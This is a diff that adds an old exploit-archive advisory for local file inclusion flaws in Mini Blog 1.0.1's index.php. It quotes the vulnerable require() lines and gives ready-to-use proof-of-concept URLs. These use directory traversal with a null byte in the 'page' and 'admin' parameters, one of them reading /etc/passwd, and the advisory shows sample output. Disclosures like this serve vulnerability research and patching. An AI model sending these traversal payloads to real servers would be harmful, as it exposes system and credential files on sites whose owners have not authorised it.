@@ -1,0 +1,47 @@
+/*
+
+	$Id: miniblog-1.0.1-lfi.txt,v 0.1 2008/12/06 04:06:00 cOndemned Exp $
+	
+	Mini Blog 1.0.1 (index.php) Multiple Local File Inclusion Vulnerabilities
+	Discovered by cOndemned
+
+	Download : http://www.bpowerhouse.info/mini_blog.htm
+	
+	Greetz : ZaBeaTy, str0ke, d2, sid.psycho, Adish, TBH & Avantura ;*
+
+*/
+
+Source of index.php
+
+	[...]
+
+	7.	$page = !empty($_GET['page']) ? $_GET['page'] : "";
+	8.	$admin = !empty($_GET['admin']) ? $_GET['admin'] : "";
+	
+	[...]
+	
+	77.	if (($page != "") && file_exists("page/" . $page . ".php")) {
+	78.		require("page/" . $page . ".php");
+	79.	} else if (($admin != "") && file_exists("admin/" . $admin . ".php")) {
+	80.		require("admin/" . $admin . ".php");
+
+	[...]
+	
+
+Proof of Concept
+
+	http://[host]/[mini_blog_1.0.1_path]/index.php?page=../../../../[local_file]%00
+	http://[host]/[mini_blog_1.0.1_path]/index.php?admin=../../../../[local_file]%00
+	
+	for example request :
+	
+	http://[host]/[mini_blog_1.0.1_path]/index.php?page=../../../../../etc/passwd%00
+	
+	...might give result like this :
+
+	root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon...
+	
+	
+EoF
+
+# milw0rm.com [2008-12-07]
